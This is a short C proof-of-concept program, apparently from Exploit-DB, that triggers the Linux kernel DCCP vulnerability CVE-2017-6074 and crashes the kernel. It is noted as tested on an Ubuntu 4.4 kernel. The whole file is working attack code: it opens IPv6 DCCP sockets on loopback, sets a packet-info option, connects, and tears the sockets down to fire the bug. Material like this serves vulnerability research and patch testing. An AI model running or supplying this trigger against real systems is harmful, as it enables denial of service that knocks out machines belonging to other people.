//
// EDB Note: More information ~ http://seclists.org/oss-sec/2017/q1/471
//
// A trigger for CVE-2017-6074, crashes kernel.
// Tested on 4.4.0-62-generic #83-Ubuntu kernel.
// https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074
//
// Andrey Konovalov <andreyknvl@gmail.com>

#define _GNU_SOURCE

#include <netinet/ip.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>

#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>

int main() {
	struct sockaddr_in6 sa1;
	sa1.sin6_family = AF_INET6;
	sa1.sin6_port = htons(20002);
	inet_pton(AF_INET6, "::1", &sa1.sin6_addr);
	sa1.sin6_flowinfo = 0;
	sa1.sin6_scope_id = 0;

	int optval = 8;

	int s1 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
	bind(s1, &sa1, 0x20);
	listen(s1, 0x9);

	setsockopt(s1, IPPROTO_IPV6, IPV6_RECVPKTINFO, &optval, 4);

	int s2 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
	connect(s2, &sa1, 0x20);

	shutdown(s1, SHUT_RDWR);
	close(s1);
	shutdown(s2, SHUT_RDWR);
	close(s2);

	return 0;
}